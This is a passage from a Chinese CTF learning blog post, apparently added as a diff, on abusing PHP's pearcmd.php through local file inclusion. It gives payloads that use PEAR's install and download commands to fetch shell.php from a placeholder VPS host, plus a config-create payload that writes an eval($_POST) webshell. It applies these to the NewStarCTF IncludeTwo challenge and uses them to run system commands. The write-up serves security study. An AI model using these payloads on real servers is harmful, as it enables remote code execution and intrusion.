+<p>但是，除此之外install命令还有另外一种利用的姿势，payload如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=/usr/local/lib/php/pearcmd.php&amp;+install+-R+/tmp+http://[vps]/shell.php</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="利用三-download"><a href="#利用三-download" class="headerlink" title="利用三:download"></a>利用三:download</h2><p>用法:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pear download http://[vps]:[port]/test1.php</span><br></pre></td></tr></table></figure>
+
+<p>这个直接下载到web目录了</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=/usr/local/lib/php/peclcmd.php&amp;+download+http://vps/1.php</span><br></pre></td></tr></table></figure>
+
+<p>或</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?+download+file=/usr/local/lib/php/pearcmd.php&amp;+http://[vps]:[port]/test1.php&amp;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+<h2 id="pearcmd被ban绕过"><a href="#pearcmd被ban绕过" class="headerlink" title="pearcmd被ban绕过"></a>pearcmd被ban绕过</h2><p>我们可以使用<code>peclcmd.php</code>代替，在这个php文件当中其实就是引入了<code>pearcmd.php</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if (&#x27;/www/server/php/52/lib/php&#x27; != &#x27;@&#x27;.&#x27;include_path&#x27;.&#x27;@&#x27;) &#123;</span><br><span class="line">    ini_set(&#x27;include_path&#x27;, &#x27;/www/server/php/52/lib/php&#x27;);</span><br><span class="line">    $raw = false;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    // this is a raw, uninstalled pear, either a cvs checkout, or php distro</span><br><span class="line">    $raw = true;</span><br><span class="line">&#125;</span><br><span class="line">define(&#x27;PEAR_RUNTYPE&#x27;, &#x27;pecl&#x27;);</span><br><span class="line">require_once &#x27;pearcmd.php&#x27;;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>学都学完了,搞道例题试试</p>
+<h3 id="NewStarCTF-公开赛赛道-IncludeTwo"><a href="#NewStarCTF-公开赛赛道-IncludeTwo" class="headerlink" title="[NewStarCTF 公开赛赛道]IncludeTwo"></a>[NewStarCTF 公开赛赛道]IncludeTwo</h3><p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212604070.png" alt="image-20250316175022777"></p>
+<p>过滤了filter&#x2F;rot13&#x2F;base64，最后会在file后面加个.php，题目提示了<code>LFI</code>本地文件包含，同时这里还有一个php后缀限制，可以使用pearcmd的trick。</p>
+<h4 id="法一config-create"><a href="#法一config-create" class="headerlink" title="法一config-create"></a>法一config-create</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=@eval($_POST[&#x27;lu1ux&#x27;]);die()?&gt;+/tmp/hello.php</span><br></pre></td></tr></table></figure>
+
+<p>由于他后面拼接了一个.php</p>
+<p>所以payload里面的pearcmd.php去掉一个.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?+config-create+/&amp;file=/usr/local/lib/php/pearcmd&amp;/&lt;?=@eval($_POST[&#x27;lu1ux&#x27;]);die()?&gt;+/tmp/hello.php</span><br></pre></td></tr></table></figure>
+
+<p>采用bp上传,避免编码</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212604222.png" alt="image-20250316180043312"></p>
+<p>但是访问这个目录时候出了问题</p>
+<p>于是改成传到&#x2F;var&#x2F;www&#x2F;html&#x2F;hello.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?+config-create+/&amp;file=/usr/local/lib/php/pearcmd&amp;/&lt;?=@eval($_POST[&#x27;lu1ux&#x27;]);die()?&gt;+/var/www/html/hello.php</span><br></pre></td></tr></table></figure>
+
+<p>访问hello.php,lu1ux&#x3D;system(“ls &#x2F;“)</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212604259.png" alt="image-20250316182504648"></p>
+<p>找到了fffflllllaaaaggggg</p>
+<p>直接cat &#x2F;fffflllllaaaaggggg</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212604657.png" alt="image-20250316182838012"></p>
+<h4 id="法二install"><a href="#法二install" class="headerlink" title="法二install"></a>法二install</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?+install+--installroot+&amp;file=/usr/local/lib/php/pearcmd&amp;+http://ip/shell.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212604738.png" alt="image-20250316185538790"></p>
+<p>下载成功了,不过没找到位置</p>
+<h4 id="法三download"><a href="#法三download" class="headerlink" title="法三download"></a>法三download</h4><p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=/usr/local/lib/php/pearcmd.php&amp;+download+http://vps/shell.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212604753.png"></p>
+<p>shell.php内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo &quot;123&quot;; ?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212604733.png" alt="image-20250316191320900"></p>
+<p>换成一句话木马即可得到flag</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="http://example.com">lu1ux</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://example.com/2025/11/25/pearcmd/">http://example.com/2025/11/25/pearcmd/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post_share"><div class="social-share" data-image="/img/2.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2025/11/25/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="php反序列化"><img class="cover" src="/img/9.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous</div><div class="prev_info">php反序列化</div></div></a></div><div class="next-post pull-right"><a href="/2025/11/25/basename/" title="basename"><img class="cover" src="/img/5.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next</div><div class="next_info">basename</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avator.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">lu1ux</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">23</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">14</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/lu1ux"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">网安小白一枚</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8pearcmd-php%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88LFI%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">利用pearcmd.php本地文件包含（LFI）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.1.</span> <span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#register-argc-argv"><span class="toc-number">1.2.</span> <span class="toc-text">register_argc_argv</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.3.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8docker%E9%85%8D%E7%BD%AELAMP"><span class="toc-number">1.4.</span> <span class="toc-text">使用docker配置LAMP???</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8PHPstudy%E9%85%8D%E7%BD%AE"><span class="toc-number">1.5.</span> <span class="toc-text">使用PHPstudy配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E4%B8%80-config-create"><span class="toc-number">1.6.</span> <span class="toc-text">利用一: config-create</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E4%BA%8C-install"><span class="toc-number">1.7.</span> <span class="toc-text">利用二:install</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E4%B8%89-download"><span class="toc-number">1.8.</span> <span class="toc-text">利用三:download</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pearcmd%E8%A2%ABban%E7%BB%95%E8%BF%87"><span class="toc-number">1.9.</span> <span class="toc-text">pearcmd被ban绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">1.10.</span> <span class="toc-text">例题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-IncludeTwo"><span class="toc-number">1.10.1.</span> <span class="toc-text">[NewStarCTF 公开赛赛道]IncludeTwo</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%B8%80config-create"><span class="toc-number">1.10.1.1.</span> <span class="toc-text">法一config-create</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%BA%8Cinstall"><span class="toc-number">1.10.1.2.</span> <span class="toc-text">法二install</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%B8%89download"><span class="toc-number">1.10.1.3.</span> <span class="toc-text">法三download</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/11/25/URLDNS/" title="URLDNS"><img src="/img/12.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="URLDNS"/></a><div class="content"><a class="title" href="/2025/11/25/URLDNS/" title="URLDNS">URLDNS</a><time datetime="2025-11-25T14:03:06.000Z" title="Created 2025-11-25 22:03:06">2025-11-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/11/25/CC%E9%93%BE/" title="CC链"><img src="/img/9.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CC链"/></a><div class="content"><a class="title" href="/2025/11/25/CC%E9%93%BE/" title="CC链">CC链</a><time datetime="2025-11-25T14:02:54.000Z" title="Created 2025-11-25 22:02:54">2025-11-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/11/25/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" title="信息泄露"><img src="/img/24.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="信息泄露"/></a><div class="content"><a class="title" href="/2025/11/25/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" title="信息泄露">信息泄露</a><time datetime="2025-11-25T13:50:42.000Z" title="Created 2025-11-25 21:50:42">2025-11-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/11/25/upload/" title="upload"><img src="/img/3.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="upload"/></a><div class="content"><a class="title" href="/2025/11/25/upload/" title="upload">upload</a><time datetime="2025-11-25T13:44:39.000Z" title="Created 2025-11-25 21:44:39">2025-11-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/11/25/SSRF/" title="SSRF"><img src="/img/13.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SSRF"/></a><div class="content"><a class="title" href="/2025/11/25/SSRF/" title="SSRF">SSRF</a><time datetime="2025-11-25T13:44:33.000Z" title="Created 2025-11-25 21:44:33">2025-11-25</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By lu1ux</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script src="/js/sakuraPlus.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
